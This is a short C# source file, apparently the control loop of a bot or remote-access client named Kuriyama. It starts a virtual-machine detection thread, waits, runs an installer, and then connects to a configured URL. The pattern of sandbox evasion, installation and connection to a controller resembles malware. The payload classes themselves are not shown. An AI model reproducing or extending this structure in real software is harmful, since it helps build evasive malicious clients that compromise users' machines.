using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;

namespace Kuriyama.control
{
    class Worker
    {
        string url;
        int timeout;

        public Worker(string url, int timeout)
        {
            this.url = url;
            this.timeout = timeout;
        }

        public void Run()
        {
            new Thread(new vmdetect.VmWorker().Run).Start();
            Thread.Sleep(5000);
            Thread installer = new Thread(new install.Installer().Run);
            try
            {
                installer.Start();
                installer.Join();
            }
            catch(Exception e)
            {
                Console.WriteLine(e.ToString());
            }
            
            new Thread(new net.Connection(url, timeout).Run).Start();
        }
    }
}
